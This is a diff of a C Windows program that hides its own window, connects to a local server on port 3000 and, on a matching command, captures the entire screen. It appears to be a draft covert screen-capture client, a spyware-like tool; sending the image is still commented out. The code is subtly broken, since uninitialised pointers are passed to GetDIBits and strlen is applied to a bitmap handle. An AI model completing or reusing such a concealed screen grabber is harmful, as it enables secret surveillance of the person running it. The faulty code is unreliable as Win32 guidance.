@@ -29,7 +29,7 @@ int main(){
     printf("Enter your login: ");
     scanf("%s", login);
 
-    // ShowWindow(hwnd, SW_HIDE); Скрывает окно и активирует другое окно.
+    ShowWindow(hwnd, SW_HIDE);
     Sleep(1000);
 
 
@@ -51,7 +51,6 @@ int main(){
     }
 
     printf("Socket created. Connecting...\n");
-    // memset(&server, 0, sizeof server);
     server.sin_addr.s_addr = inet_addr("127.0.0.1");
     server.sin_family = AF_INET;
     server.sin_port = htons(3000);
@@ -104,6 +103,9 @@ int main(){
         
         if (strcmp(recvbuf, chek) == 0){
 
+            BYTE *pData;
+            BITMAPINFO *pHeader;
+
             x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
             y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
             x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
@@ -119,7 +121,13 @@ int main(){
 
             BOOL bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
 
-            // send(s, hbitmap, (int)strlen(send_data_new),  0);
+            int file_size = GetDIBits(hScreen, hbitmap, 0, h, pData, pHeader, DIB_PAL_COLORS);
+
+            DeleteDC(hScreen);
+            DeleteDC(hDC);
+
+            // send(s, hbitmap, (int)strlen(hbitmap),  0);
+
         }
         else {
             printf("not equal");
